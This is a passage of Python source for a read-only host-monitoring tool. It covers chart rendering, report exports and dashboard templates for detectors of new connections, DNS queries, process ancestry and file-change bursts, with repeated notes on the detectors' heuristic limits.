            parts.append(f'<path d="M {x0:.2f} {y0:.2f} A {r_out:.2f} {r_out:.2f} 0 {lg} 1 '
                         f'{x1:.2f} {y1:.2f} L {x2:.2f} {y2:.2f} A {r_in:.2f} {r_in:.2f} 0 '
                         f'{lg} 0 {x3:.2f} {y3:.2f} Z" fill="{color}">'
                         f'<title>{html_escape(label)}: {html_escape(fmt(value))}</title>'
                         f'</path>')
        angle += sweep
        legend.append(f'<div class="lg"><i style="background:{color}"></i>'
                      f'<span>{html_escape(label)}</span><b>{html_escape(fmt(value))}</b>'
                      f'</div>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<div class="chart-row"><svg viewBox="0 0 {size} {size}" width="{size}" '
            f'height="{size}" role="img" aria-label="{html_escape(title)}">{"".join(parts)}'
            f'<text x="{cx}" y="{cy + 5}" text-anchor="middle" class="pie-n">'
            f'{html_escape(fmt(total))}</text></svg>'
            f'<div class="legend">{"".join(legend)}</div></div></figure>')


def svg_bar(items, width=430, title="", color="#5b8def", fmt=lambda v: f"{v:g}",
            colors=None):
    items = [(str(l), float(v or 0)) for l, v in items]
    if not items or all(v <= 0 for _, v in items):
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    row_h, gap, pad_l, pad_t = 22, 7, 170, 8
    height = pad_t * 2 + len(items) * (row_h + gap)
    mx = max(v for _, v in items) or 1
    bw = width - pad_l - 62
    rows = []
    for i, (label, value) in enumerate(items):
        y = pad_t + i * (row_h + gap)
        w = max(2.0, bw * value / mx)
        c = (colors or {}).get(label, color)
        lbl = label if len(label) <= 24 else "\u2026" + label[-23:]
        rows.append(
            f'<text x="{pad_l - 9}" y="{y + row_h * 0.7:.1f}" text-anchor="end" class="bl">'
            f'{html_escape(lbl)}</text>'
            f'<rect x="{pad_l}" y="{y}" width="{bw}" height="{row_h}" rx="4" class="btrack"/>'
            f'<rect x="{pad_l}" y="{y}" width="{w:.1f}" height="{row_h}" rx="4" fill="{c}">'
            f'<title>{html_escape(label)}: {html_escape(fmt(value))}</title></rect>'
            f'<text x="{pad_l + bw + 7:.1f}" y="{y + row_h * 0.7:.1f}" class="bv">'
            f'{html_escape(fmt(value))}</text>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="{width}" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(rows)}</svg></figure>')


def svg_history(rows: list[dict], width=430, height=150,
                title="Score over time") -> str:
    pts = [r for r in rows if r.get("score") is not None]
    if len(pts) < 2:
        return (f'<div class="chart-empty">{html_escape(title)}: needs at least two checks '
                f'({len(pts)} so far)</div>')
    pad = 30
    mx = max(max(p["score"] for p in pts), 1)
    step = (width - pad * 2) / max(len(pts) - 1, 1)
    coords = [(pad + i * step,
               height - pad - (height - pad * 2) * clamp(p["score"] / mx, 0, 1))
              for i, p in enumerate(pts)]
    d = " ".join(f"{'M' if i == 0 else 'L'} {x:.1f} {y:.1f}"
                 for i, (x, y) in enumerate(coords))
    dots = "".join(
        f'<circle cx="{x:.1f}" cy="{y:.1f}" r="3" '
        f'fill="{risk_band(pts[i]["score"])[1]}">'
        f'<title>#{pts[i].get("id")}: {pts[i]["score"]}</title></circle>'
        for i, (x, y) in enumerate(coords))
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="{width}" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">'
            f'<path d="{d}" fill="none" stroke="#5b8def" stroke-width="2"/>{dots}'
            f'</svg></figure>')


# =============================================================================
# SECTION 9 - Exports
# =============================================================================

def counts_by_detector(sid: int, conn=None) -> dict:
    out: dict[str, dict] = {}
    for r in q("SELECT detector, severity, COUNT(*) n FROM findings WHERE scan_id=? "
               "GROUP BY detector, severity", (sid,), conn):
        out.setdefault(r["detector"], {})[r["severity"]] = r["n"]
    return out


def report_payload(sid=None, conn=None) -> dict:
    own = conn is None
    conn = conn or connect()
    try:
        sid = sid or latest_scan_id(conn)
        scan = scan_summary(sid, conn) if sid else None
        return {
            "tool": APP_NAME, "version": VERSION, "author": AUTHOR,
            "generated_at": now_iso(), "disclaimer": DISCLAIMER_LONG,
            "heuristics_not_verdicts": HEURISTIC_NOT_VERDICT,
            "doh_blind_spot": DOH_BLIND_SPOT,
            "polling_limit": POLLING_LIMIT,
            "limitations": [
                "Every detector is a heuristic. New connections, public resolvers, shells "
                "spawned by build tools and mass file writes are all ordinary activity.",
                "It polls, so anything starting and finishing between two polls is never "
                "seen.",
                "DNS over HTTPS and DNS over TLS are invisible - they look like HTTPS. No "
                "queries seen is a blind spot, not a clean result.",
                "Query names need packet capture, which needs root. Without it the tool "
                "reports which resolvers are contacted but not what was asked.",
                "Process ownership of sockets needs privileges; without them some "
                "connections show no owner, which is a coverage limit and not evidence of "
                "hiding.",
                "The first run makes everything the baseline - including anything already "
                "wrong with the machine.",
                "Read-only: no process is killed, no connection blocked, no file changed.",
            ],
            "scan": scan,
            "counts_by_detector": counts_by_detector(sid, conn) if sid else {},
            "findings": [dict(r) for r in q(
                "SELECT detector,category,title,severity,description,evidence,advice "
                "FROM findings WHERE scan_id=? ORDER BY CASE severity "
                "WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 "
                "WHEN 'low' THEN 3 ELSE 4 END, detector, id", (sid,), conn)]
            if sid else [],
            "history": [dict(r) for r in q(
                "SELECT id, ts, score, band FROM scans ORDER BY id DESC LIMIT 40",
                (), conn)][::-1],
            "known": [dict(r) for r in q("SELECT * FROM known ORDER BY kind, key "
                                         "LIMIT 500", (), conn)],
        }
    finally:
        if own:
            conn.close()


def export_json(sid=None) -> str:
    return json.dumps(report_payload(sid), indent=2, default=str)


def export_csv(sid=None) -> str:
    conn = connect()
    try:
        sid = sid or latest_scan_id(conn)
        scan = scan_summary(sid, conn)
        buf = io.StringIO()
        w = csv.writer(buf, lineterminator="\n")
        w.writerow([f"# {APP_NAME} v{VERSION} by {AUTHOR}"])
        w.writerow([f"# scan={sid} generated={now_iso()}"])
        w.writerow([f"# {DISCLAIMER_SHORT}"])
        w.writerow(["# Every detector is a heuristic and not a verdict. A new "
                    "connection, a shell spawned by a build tool and a burst of file "
                    "writes are all ordinary activity."])
        if not scan:
            return buf.getvalue()
        w.writerow([])
        w.writerow(["## Check"])
        w.writerow(["hostname", "detectors", "score", "band", "connections",
                    "processes", "ancestry_hits", "files_touched", "file_rate",
                    "watch_root"])
        w.writerow([scan["hostname"], ",".join(scan["detectors"]), scan["score"],
                    scan["band"], scan["connections"], scan["processes"],
                    scan["ancestry_hits"], scan["files_touched"], scan["file_rate"],
                    scan["watch_root"]])
        w.writerow([])
        w.writerow(["## Findings"])
        w.writerow(["detector", "severity", "category", "title", "description", "advice"])
        for r in q("SELECT * FROM findings WHERE scan_id=? ORDER BY detector, id",
                   (sid,), conn):
            w.writerow([r["detector"], r["severity"], r["category"], r["title"],
                        r["description"], r["advice"]])
        w.writerow([])
        w.writerow(["## Known (baseline)"])
        w.writerow(["kind", "key", "times_seen", "first_seen", "last_seen", "approved"])
        for r in q("SELECT * FROM known ORDER BY kind, key LIMIT 2000", (), conn):
            w.writerow([r["kind"], r["key"], r["times_seen"], r["first_seen"],
                        r["last_seen"], r["approved"]])
        return buf.getvalue()
    finally:
        conn.close()


def export_html(sid=None) -> str:
    conn = connect()
    try:
        p = report_payload(sid, conn)
        scan, esc = p["scan"], html_escape
        if not scan:
            return "<!doctype html><html><body><h1>No checks recorded</h1></body></html>"
        counts = {s: scan[s] or 0 for s in SEVERITIES}
        payload = scan.get("payload") or {}
        lanes = svg_detectors(p["counts_by_detector"], payload.get("sources") or {})
        tree = svg_tree(payload.get("ancestry") or [])
        pie = svg_pie([(s, counts[s], SEV_COLOR[s]) for s in SEVERITIES])
        hist = svg_history(p["history"])
        fsum = payload.get("file_summary") or {}
        fbar = (svg_bar(fsum.get("by_extension", [])[:8],
                        title="File changes by extension", color="#f76808")
                if fsum.get("by_extension") else "")
        frows = "".join(
            f'<tr><td><span class="pill" style="background:{SEV_COLOR[f["severity"]]}">'
            f'{esc(f["severity"].upper())}</span>'
            f'<div class="sub2" style="margin-top:4px">{esc(f["detector"])}</div></td>'
            f'<td><b>{esc(f["title"])}</b>'
            f'<div class="desc">{esc(f["description"])}</div>'
            + (f'<pre>{esc(f["evidence"])}</pre>' if f["evidence"] else "")
            + (f'<div class="means"><b>What to make of it:</b> {esc(f["advice"])}</div>'
               if f["advice"] else "") + "</td></tr>" for f in p["findings"])
        limits = "".join(f"<li>{esc(x)}</li>" for x in p["limitations"])
        return f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{APP_SHORT} - {esc(scan['hostname'] or '')}</title><style>
 body{{font:14px/1.55 ui-sans-serif,system-ui,'Segoe UI',Roboto,sans-serif;margin:0;
      background:#0f1115;color:#e6e8ee}}
 .wrap{{max-width:1100px;margin:0 auto;padding:28px 20px 60px}}
 h1{{font-size:22px;margin:0 0 4px}} .meta{{color:#8b8f9b;font-size:12.5px}}
 h2{{font-size:12px;text-transform:uppercase;letter-spacing:.15em;color:#8b8f9b;
     margin:30px 0 12px;border-bottom:1px solid #262a33;padding-bottom:8px}}
 .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:18px 0}}
 .card{{background:#171a21;border:1px solid #262a33;border-radius:10px;padding:12px 14px}}
 .card .n{{font-size:21px;font-weight:700;font-family:ui-monospace,monospace}}
 .card .l{{font-size:10.5px;text-transform:uppercase;letter-spacing:.11em;color:#8b8f9b}}
 table{{width:100%;border-collapse:collapse;background:#171a21;border:1px solid #262a33;
        border-radius:10px;overflow:hidden;font-size:12.7px}}
 th{{text-align:left;font-size:10.5px;letter-spacing:.11em;text-transform:uppercase;
     color:#8b8f9b;padding:9px 11px;border-bottom:1px solid #262a33;background:#1c2029}}
 td{{padding:8px 11px;border-bottom:1px solid #1e222a;vertical-align:top}}
 .mono{{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;word-break:break-word}}
 .sub2{{color:#6f7685;font-size:10.5px;font-family:ui-monospace,monospace}}
 .pill{{color:#0f1115;font-weight:700;font-size:10px;padding:2px 8px;border-radius:20px}}
 .desc{{color:#b6bac4;margin-top:4px;max-width:84ch}}
 .means{{margin-top:6px;color:#8fd3b0;font-size:12.4px;max-width:84ch}}
 pre{{background:#0f1115;border:1px solid #262a33;border-radius:6px;padding:9px;
      font-family:ui-monospace,monospace;font-size:11.5px;margin:6px 0 0;overflow:auto;
      white-space:pre-wrap;color:#b6bac4;max-height:300px}}
 .warn{{background:#231a12;border:1px solid #5a3b1c;color:#ffcf9e;padding:12px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0;white-space:pre-wrap}}
 .note{{background:#12202a;border:1px solid #1c4a5e;color:#a8d8e8;padding:11px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0}}
 .note ul{{margin:6px 0 0 18px;padding:0}} .note li{{margin:3px 0}}
 .charts{{display:flex;gap:18px;flex-wrap:wrap;align-items:flex-start;margin-bottom:14px}}
 .chart{{margin:0;background:#171a21;border:1px solid #262a33;border-radius:10px;
   padding:14px 16px}}
 .chart.wide{{width:100%}}
 .chart figcaption{{font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;
   color:#8b8f9b;margin-bottom:10px;font-family:ui-monospace,monospace}}
 .chart-row{{display:flex;gap:16px;align-items:center;flex-wrap:wrap}}
 .chart-empty{{background:#171a21;border:1px dashed #31363f;border-radius:10px;padding:18px;
   color:#8b8f9b;font-size:12.5px}}
 .legend{{display:flex;flex-direction:column;gap:6px;min-width:130px}}
 .lg{{display:flex;align-items:center;gap:7px;font-size:12.5px}}
 .lg i{{width:11px;height:11px;border-radius:3px}} .lg span{{flex:1}}
 text.bl{{fill:#8b8f9b;font:10.5px ui-monospace,monospace}}
 text.bv{{fill:#e6e8ee;font:11px ui-monospace,monospace}}
 text.det{{fill:#e6e8ee;font:700 13px ui-monospace,monospace}}
 text.detsub{{fill:#6f7685;font:10px ui-monospace,monospace}}
 text.node{{fill:#e6e8ee;font:11px ui-monospace,monospace}}
 text.arrow{{fill:#6f7685;font:13px ui-monospace,monospace}}
 text.pie-n{{fill:#e6e8ee;font:700 16px ui-monospace,monospace}}
 rect.btrack{{fill:#1e222a}}
 footer{{margin-top:36px;color:#6f7685;font-size:12px;border-top:1px solid #262a33;
   padding-top:14px}}
</style></head><body><div class="wrap">
<h1>Host behaviour report</h1>
<div class="meta">{esc(scan['hostname'])} &middot; {ts_pretty(scan['ts'])} &middot;
 {scan['elapsed_ms']} ms &middot; detectors: {esc(', '.join(scan['detectors']))}</div>
<div class="note"><b>Every detector here is a heuristic, not a verdict.</b>
 {esc(p['heuristics_not_verdicts'])}<ul>{limits}</ul></div>
<div class="warn">{esc(DISCLAIMER_LONG)}</div>
<div class="grid">
 <div class="card"><div class="l">Verdict</div>
  <div class="n" style="font-size:14px;color:{scan['band_colour']}">
   {esc(scan['band'] or '')}</div><div class="l">score {scan['score']}</div></div>
 <div class="card"><div class="l">Connections</div>
  <div class="n">{scan['connections']}</div></div>
 <div class="card"><div class="l">Processes</div>
  <div class="n">{scan['processes']}</div>
  <div class="l">{scan['ancestry_hits']} flagged</div></div>
 <div class="card"><div class="l">DNS queries</div>
  <div class="n">{scan['dns_queries']}</div></div>
 <div class="card"><div class="l">Files changed</div>
  <div class="n">{scan['files_touched']}</div>
  <div class="l">{scan['file_rate']}/s</div></div>
{"".join(f'<div class="card"><div class="l">{s}</div><div class="n" '
         f'style="color:{SEV_COLOR[s]}">{counts[s]}</div></div>'
         for s in SEVERITIES if counts[s])}
</div>
<h2>Detectors</h2><div class="charts">{lanes}</div>
<h2>Process ancestry</h2><div class="charts">{tree}</div>
<h2>Analytics</h2><div class="charts">{pie}{hist}{fbar}</div>
<h2>Findings ({len(p['findings'])})</h2>
{'<table><tr><th>Severity</th><th>Detail</th></tr>' + frows + '</table>'
 if frows else '<div class="chart-empty">No findings.</div>'}
<footer>Generated by {APP_NAME} v{VERSION} &middot; {AUTHOR} &middot; {GITHUB}<br>
 Read-only. No process was killed, no connection blocked and no file changed.</footer>
</div></body></html>"""
    finally:
        conn.close()


# =============================================================================
# SECTION 10 - Web application (no CDN, no JS libraries)
# =============================================================================

CSS = """
:root{--bg:#0f1115;--panel:#171a21;--panel-2:#1c2029;--line:#262a33;--line-2:#31363f;
 --tx:#e6e8ee;--tx-dim:#8b8f9b;--tx-mid:#b6bac4;--accent:#9775fa;--ok:#30a46c;
 --warn:#ffb224;--crit:#e5484d;--good:#8fd3b0;
 --mono:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,'Courier New',monospace;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--tx);
 font:14px/1.55 ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
header.top{border-bottom:1px solid var(--line);background:var(--panel);position:sticky;top:0;z-index:9}
.hd{max-width:1200px;margin:0 auto;padding:11px 20px;display:flex;align-items:center;gap:14px;
 flex-wrap:wrap}
.brand{font-family:var(--mono);font-weight:700;letter-spacing:-.4px;font-size:15px}
.brand b{color:var(--accent)}
.brand small{display:block;font-weight:400;font-size:10px;letter-spacing:.14em;
 text-transform:uppercase;color:var(--tx-dim)}
nav{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
nav a{font-family:var(--mono);font-size:11.5px;letter-spacing:.05em;text-transform:uppercase;
 padding:6px 10px;border-radius:6px;color:var(--tx-dim)}
nav a:hover{background:var(--panel-2);color:var(--tx);text-decoration:none}
nav a.on{background:var(--accent);color:#0b0d10;font-weight:600}
.wrap{max-width:1200px;margin:0 auto;padding:20px 20px 70px}
.banner{background:#12202a;border:1px solid #1c4a5e;color:#a8d8e8;padding:10px 14px;
 border-radius:9px;font-size:12.3px;margin-bottom:12px;line-height:1.5}
.banner.warn{background:#231a12;border-color:#5a3b1c;color:#ffcf9e}
.banner.bad{background:#2a1216;border-color:#6b2229;color:#ffc9cd}
.banner b{color:#fff} .banner ul{margin:6px 0 0 18px;padding:0} .banner li{margin:3px 0}
h1{font-size:19px;margin:0 0 3px;letter-spacing:-.3px}
h2{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
 color:var(--tx-dim);margin:24px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--line)}
.sub{color:var(--tx-dim);font-size:12.5px;margin-bottom:14px}
.sub2{color:var(--tx-dim);font-size:10.5px;font-family:var(--mono)}
.bar{display:flex;gap:9px;align-items:center;flex-wrap:wrap;margin:0 0 16px}
.btn{font-family:var(--mono);font-size:12px;padding:8px 13px;border-radius:7px;cursor:pointer;
 border:1px solid var(--line-2);background:var(--panel-2);color:var(--tx);display:inline-block}
.btn:hover{border-color:var(--accent);text-decoration:none}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#0b0d10;font-weight:700}
.btn.tiny{padding:3px 8px;font-size:10.5px}
input[type=text],select{font-family:var(--mono);font-size:12px;padding:7px 9px;
 background:var(--panel-2);color:var(--tx);border:1px solid var(--line-2);border-radius:7px}
label.chk{font-family:var(--mono);font-size:11.5px;color:var(--tx-dim);display:flex;gap:5px;
 align-items:center}
.grid{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(132px,1fr));margin:14px 0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:13px 15px}
.card .l{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;
 color:var(--tx-dim)}
.card .n{font-size:21px;font-weight:700;line-height:1.3;font-family:var(--mono)}
table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);
 border-radius:11px;overflow:hidden;font-size:12.7px}
th{text-align:left;font-family:var(--mono);font-size:10.5px;letter-spacing:.11em;
 text-transform:uppercase;color:var(--tx-dim);padding:9px 11px;border-bottom:1px solid var(--line);
 background:var(--panel-2);white-space:nowrap}
td{padding:8px 11px;border-bottom:1px solid #1e222a;vertical-align:top}
tr:last-child td{border-bottom:none} tr:hover td{background:#1b1f27}
.mono{font-family:var(--mono);font-size:11.8px;word-break:break-word}
.num{font-family:var(--mono);font-size:11.8px;text-align:right}
.pill{display:inline-block;color:#0b0d10;font-weight:700;font-size:10px;padding:2px 8px;
 border-radius:20px;letter-spacing:.06em;font-family:var(--mono);white-space:nowrap}
.tag{display:inline-block;font-family:var(--mono);font-size:10px;padding:1px 6px;border-radius:5px;
 border:1px solid var(--line-2);color:var(--tx-dim);white-space:nowrap;margin-left:4px}
.tag.good{border-color:#1e5138;color:#7fd9ab}
.desc{color:var(--tx-mid);margin-top:4px;max-width:84ch}
.means{margin-top:6px;color:var(--good);font-size:12.4px;max-width:84ch}
pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:9px 11px;
 font-family:var(--mono);font-size:11.5px;margin:6px 0 0;max-height:300px;overflow:auto;
 white-space:pre-wrap;color:var(--tx-mid)}
.charts{display:flex;gap:18px;flex-wrap:wrap;align-items:flex-start;margin-bottom:14px}
.chart{margin:0;background:var(--panel);border:1px solid var(--line);border-radius:11px;
 padding:14px 16px}
.chart.wide{width:100%}
.chart figcaption{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;
 text-transform:uppercase;color:var(--tx-dim);margin-bottom:10px}
.chart-row{display:flex;gap:16px;align-items:center;flex-wrap:wrap}
.chart-empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;
 padding:20px;color:var(--tx-dim);font-size:12.5px;flex:1;min-width:240px}
.legend{display:flex;flex-direction:column;gap:6px;min-width:130px}
.lg{display:flex;align-items:center;gap:7px;font-size:12.5px}
.lg i{width:11px;height:11px;border-radius:3px;flex:none} .lg span{flex:1}
.lg b{font-family:var(--mono)}
text.bl{fill:#8b8f9b;font:10.5px var(--mono)} text.bv{fill:#e6e8ee;font:11px var(--mono)}
text.det{fill:#e6e8ee;font:700 13px var(--mono)}
text.detsub{fill:#6f7685;font:10px var(--mono)}
text.node{fill:#e6e8ee;font:11px var(--mono)}
text.arrow{fill:#6f7685;font:13px var(--mono)}
text.pie-n{fill:#e6e8ee;font:700 16px var(--mono)}
rect.btrack{fill:#1e222a}
.empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;padding:28px;
 text-align:center;color:var(--tx-dim)}
.empty b{display:block;color:var(--tx);margin-bottom:6px;font-size:15px}
footer{max-width:1200px;margin:0 auto;padding:16px 20px 40px;color:#6f7685;font-size:11.5px;
 border-top:1px solid var(--line);line-height:1.7}
.lvl-ERROR{color:var(--crit)} .lvl-WARN{color:var(--warn)} .lvl-INFO{color:var(--tx-dim)}
@media (max-width:640px){.hd{padding:10px 14px} .wrap{padding:14px 14px 50px}
 nav{margin-left:0;width:100%} .card .n{font-size:18px} table{font-size:12px}
 th,td{padding:7px 8px}}
"""

BASE_TPL = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ page }} - """ + APP_SHORT + """</title><style>""" + CSS + """</style></head><body>
<header class="top"><div class="hd">
 <div class="brand"><b>HOSTWATCH</b> <small>four behaviour detectors</small></div>
 <nav>
  <a href="{{ url_for('page_overview') }}" class="{{ 'on' if nav=='overview' }}">Overview</a>
  <a href="{{ url_for('page_baseline') }}" class="{{ 'on' if nav=='baseline' }}">Baseline</a>
  <a href="{{ url_for('page_scans') }}" class="{{ 'on' if nav=='scans' }}">Checks</a>
  <a href="{{ url_for('page_learn') }}" class="{{ 'on' if nav=='learn' }}">Learn</a>
  <a href="{{ url_for('page_logs') }}" class="{{ 'on' if nav=='logs' }}">Logs</a>
 </nav></div></header>
<div class="wrap">
 <div class="banner"><b>Every detector here is a heuristic, not a verdict.</b>
  """ + HEURISTIC_NOT_VERDICT + """</div>
 {% if error %}<div class="banner bad"><b>That failed:</b> {{ error }}</div>{% endif %}
 {% if flash %}<div class="banner">{{ flash }}</div>{% endif %}
 {% block body %}{% endblock %}
</div>
<footer>""" + APP_NAME + """ v""" + VERSION + """ &middot; built by """ + AUTHOR + """ &middot;
 <a href=\"""" + GITHUB + """\" rel="noopener">GitHub</a> &middot;
 <a href=\"""" + LINKEDIN + """\" rel="noopener">LinkedIn</a><br>
 Read-only: no process is killed, no connection blocked and no file changed. It polls, so
 anything starting and finishing between two polls is never seen. DNS over HTTPS is
 invisible.</footer>
</body></html>"""

RUNBAR_TPL = """
<form method="post" action="{{ url_for('do_check') }}" class="bar">
 {% for d in detectors %}
 <label class="chk"><input type="checkbox" name="detector" value="{{ d }}" checked>
  {{ d }}</label>
 {% endfor %}
 <input type="text" name="watch_root" placeholder="directory to watch (for files)"
  value="{{ last_root or '' }}" style="min-width:220px">
 <select name="capture_seconds">
  <option value="0">no DNS capture</option>
  {% for s in [10,30,60] %}<option value="{{ s }}">capture DNS {{ s }}s</option>{% endfor %}
 </select>
 <button class="btn primary" type="submit">Run check</button>
</form>"""

EMPTY_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Overview</h1>
""" + RUNBAR_TPL + """
<div class="empty"><b>Nothing checked yet</b>
 Four detectors: new outbound connections, DNS queries, suspicious process ancestry, and
 bursts of file modification. The first run records a baseline - the second is when new
 things start showing up.
 <div class="mono" style="margin-top:12px;color:var(--tx-dim)">
  from the terminal: python3 hostwatch.py check --watch-root ~/Documents</div>
</div>{% endblock %}"""

OVERVIEW_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Overview</h1>
<div class="sub">Check #{{ scan.id }} &middot; {{ ts_pretty(scan.ts) }} &middot;
 {{ scan.elapsed_ms }} ms &middot; {{ ', '.join(scan.detectors) }}</div>
""" + RUNBAR_TPL + """
{% if scan.detail %}<div class="banner warn"><b>Partial:</b> {{ scan.detail }}</div>{% endif %}
<div class="grid">
 <div class="card"><div class="l">Verdict</div>
  <div class="n" style="font-size:14px;color:{{ scan.band_colour }}">{{ scan.band }}</div>
  <div class="l">score {{ scan.score }}</div></div>
 <div class="card"><div class="l">Connections</div>
  <div class="n">{{ scan.connections }}</div></div>
 <div class="card"><div class="l">Processes</div><div class="n">{{ scan.processes }}</div>
  <div class="l">{{ scan.ancestry_hits }} flagged</div></div>
 <div class="card"><div class="l">DNS queries</div>
  <div class="n">{{ scan.dns_queries }}</div></div>
 <div class="card"><div class="l">Files changed</div>
  <div class="n">{{ scan.files_touched }}</div>
  <div class="l">{{ scan.file_rate }}/s</div></div>
{% for s in severities %}{% if scan[s] %}
 <div class="card"><div class="l">{{ s }}</div>
  <div class="n" style="color:{{ sev[s] }}">{{ scan[s] }}</div></div>
{% endif %}{% endfor %}
</div>
<h2>Detectors</h2><div class="charts">{{ lanes|safe }}</div>
{% if tree %}<h2>Process ancestry</h2><div class="charts">{{ tree|safe }}</div>{% endif %}
<h2>Analytics</h2><div class="charts">{{ pie|safe }}{{ hist|safe }}</div>
<h2>Findings ({{ findings|length }})</h2>
<div class="bar"><form method="get" style="display:flex;gap:8px">
 <select name="detector" onchange="this.form.submit()">
  <option value="">all detectors</option>
  {% for d in detectors %}<option value="{{ d }}" {{ 'selected' if d==f_det }}>{{ d }}</option>
  {% endfor %}</select>
 <input type="hidden" name="scan" value="{{ scan.id }}">
</form></div>
{% if findings %}
<table><tr><th>Severity</th><th>Detail</th></tr>
{% for f in findings %}
<tr><td><span class="pill" style="background:{{ sev[f.severity] }}">
 {{ f.severity|upper }}</span><div class="sub2" style="margin-top:4px">{{ f.detector }}</div></td>
 <td><b>{{ f.title }}</b><div class="desc">{{ f.description }}</div>
  {% if f.evidence %}<pre>{{ f.evidence }}</pre>{% endif %}
  {% if f.advice %}<div class="means"><b>What to make of it:</b> {{ f.advice }}</div>
  {% endif %}</td></tr>
{% endfor %}</table>
{% else %}<div class="empty">No findings match.</div>{% endif %}
<div class="bar" style="margin-top:16px">
 <a class="btn" href="{{ url_for('export', fmt='html') }}?scan={{ scan.id }}">Export HTML</a>
 <a class="btn" href="{{ url_for('export', fmt='json') }}?scan={{ scan.id }}">JSON</a>
 <a class="btn" href="{{ url_for('export', fmt='csv') }}?scan={{ scan.id }}">CSV</a>
</div>
{% endblock %}"""

BASELINE_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Baseline</h1>
<div class="sub">{{ rows|length }} thing(s) seen before. Approving one stops it being
 reported as new or unusual.</div>
<div class="banner"><b>The first run makes everything the baseline</b> - including anything
 already wrong with this machine. A baseline is only as trustworthy as the moment it was
 taken.</div>
<div class="bar"><form method="get" style="display:flex;gap:8px;flex-wrap:wrap">
 <select name="kind"><option value="">all kinds</option>
  {% for k in kinds %}<option value="{{ k }}" {{ 'selected' if k==f_kind }}>{{ k }}</option>
  {% endfor %}</select>
 <input type="text" name="qq" value="{{ f_q }}" placeholder="search">
 <button class="btn" type="submit">Filter</button>
 <a class="btn" href="{{ url_for('page_baseline') }}">Reset</a>
</form></div>
{% if rows %}
<table><tr><th>Kind</th><th>Key</th><th>Seen</th><th>First</th><th>Last</th><th></th></tr>
{% for r in rows %}<tr>
 <td class="sub2">{{ r.kind }}</td>
 <td class="mono">{{ r.key }}{% if r.approved %}<span class="tag good">approved</span>
  {% endif %}{% if r.label %}<div class="sub2">{{ r.label }}</div>{% endif %}</td>
 <td class="num">{{ r.times_seen }}</td>
 <td class="mono">{{ (r.first_seen or '')[:16].replace('T',' ') }}</td>
 <td class="mono">{{ ago(r.last_seen) }}</td>
 <td>{% if r.approved %}
   <form method="post" action="{{ url_for('do_revoke') }}" style="display:inline">
    <input type="hidden" name="kind" value="{{ r.kind }}">
    <input type="hidden" name="key" value="{{ r.key }}">
    <button class="btn tiny" type="submit">revoke</button></form>
  {% else %}
   <form method="post" action="{{ url_for('do_approve') }}" style="display:inline">
    <input type="hidden" name="kind" value="{{ r.kind }}">
    <input type="hidden" name="key" value="{{ r.key }}">
    <button class="btn tiny" type="submit">approve</button></form>
  {% endif %}</td></tr>
{% endfor %}</table>
{% else %}<div class="empty"><b>Nothing recorded yet</b></div>{% endif %}
{% endblock %}"""

SCANS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Checks</h1><div class="sub">{{ rows|length }} check(s) stored locally.</div>
{% if rows %}
<table><tr><th>#</th><th>When</th><th>Detectors</th><th>Score</th><th>Verdict</th>
 <th>Conns</th><th>Files</th><th></th></tr>
{% for r in rows %}<tr>
 <td class="mono">#{{ r.id }}</td>
 <td class="mono">{{ r.ts[:19].replace('T',' ') }}</td>
 <td class="sub2">{{ r.detectors|replace('"','')|replace('[','')|replace(']','') }}</td>
 <td class="num" style="color:{{ bandcol(r.score) }}">{{ r.score }}</td>
 <td class="sub2">{{ r.band }}</td>
 <td class="num">{{ r.connections }}</td>
 <td class="num">{{ r.files_touched }}</td>
 <td><a class="btn" href="{{ url_for('page_overview') }}?scan={{ r.id }}">view</a></td>
</tr>{% endfor %}</table>
{% else %}<div class="empty"><b>Nothing checked yet</b></div>{% endif %}
{% endblock %}"""

LEARN_TPL = """{% extends 'base.html' %}{% block body %}
<h1>The four detectors, and what each one misses</h1>
<div class="banner bad"><b>None of these four things is inherently bad.</b> A new connection
 is what happens the first time you use a program. A query to a public resolver may be your
 own configuration. Build systems and service managers spawn shells constantly. A compile, a
 backup or an unzip modifies thousands of files in seconds. What makes any of them
 interesting is context this tool does not have.</div>
<h2>1. New network connections</h2>
<div class="desc">Every outbound connection, matched to the process that owns it via
 <span class="mono">/proc/net</span> and <span class="mono">/proc/*/fd</span>. The signal is
